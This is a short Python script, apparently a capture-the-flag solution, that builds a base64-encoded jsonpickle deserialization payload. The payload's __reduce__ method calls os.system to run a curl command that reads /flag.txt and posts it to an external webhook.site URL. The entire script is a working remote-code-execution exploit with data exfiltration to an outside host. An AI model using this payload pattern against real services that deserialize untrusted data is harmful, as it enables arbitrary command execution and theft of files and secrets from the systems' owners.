import jsonpickle
import sys
from base64 import b64encode as e

COMMAND = "curl -d $(cat /flag.txt) https://webhook.site/cf4e76ba-ad0b-4c72-a914-ffbd76c67f16"

class Shell(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print(e(jsonpickle.encode((Shell()))))